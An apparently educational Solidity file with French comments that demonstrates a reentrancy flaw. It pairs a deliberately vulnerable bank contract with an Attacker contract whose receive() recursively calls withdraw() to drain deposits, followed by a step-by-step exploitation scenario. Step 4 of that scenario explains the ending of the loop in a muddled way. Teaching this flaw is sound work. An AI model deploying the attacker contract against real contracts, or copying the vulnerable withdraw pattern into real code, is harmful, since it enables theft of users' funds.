// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/**
 * VULNERABILITE #1 : REENTRANCY (réentrance)
 *
 * Découverte célèbre : The DAO Hack (2016), 60M$ volés, fork Ethereum/ETC.
 *
 * Principe : un contrat appelle une fonction externe (ex : .call) AVANT
 * d'avoir mis à jour son état. L'appelé peut alors rappeler la même fonction
 * et drainer le solde plusieurs fois.
 */

// ========== Contrat VULNERABLE ==========
contract VulnerableBank {
    mapping(address => uint256) public balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    /**
     * BUG : balances[msg.sender] = 0 APRES l'appel externe.
     */
    function withdraw() external {
        uint256 bal = balances[msg.sender];
        require(bal > 0, "No balance");

        // Le call envoie ETH au caller AVANT la mise à jour
        (bool ok, ) = msg.sender.call{value: bal}("");
        require(ok, "Transfer failed");

        balances[msg.sender] = 0; // <-- TROP TARD
    }
}

// ========== Attaquant ==========
contract Attacker {
    VulnerableBank public victim;
    uint256 public stolenTotal;

    constructor(address _victim) payable {
        victim = VulnerableBank(_victim);
    }

    function attack() external payable {
        victim.deposit{value: msg.value}();
        victim.withdraw();
    }

    // Fallback rappele withdraw tant que la banque a des fonds
    receive() external payable {
        stolenTotal += msg.value;
        if (address(victim).balance >= msg.value) {
            victim.withdraw(); // RAPPEL RECURSIF
        }
    }
}

/**
 * Scénario d'exploitation :
 *  1. Alice et Bob déposent 5 ETH chacun -> banque = 10 ETH
 *  2. Attaquant dépose 1 ETH -> banque = 11 ETH, balance attaquant = 1 ETH
 *  3. Attaquant appelle withdraw()
 *     -> .call envoie 1 ETH au receive() de l'attaquant
 *     -> receive() rappelle withdraw() : balances[attaquant] vaut encore 1 ETH
 *     -> nouvelle réception de 1 ETH
 *     -> ... boucle jusqu'à drainer toute la banque
 *  4. Quand la banque est vide, le require(ok) ne bloque pas car .call à un
 *     contrat sans payload réussit aussi avec value=0 du dernier appel
 */
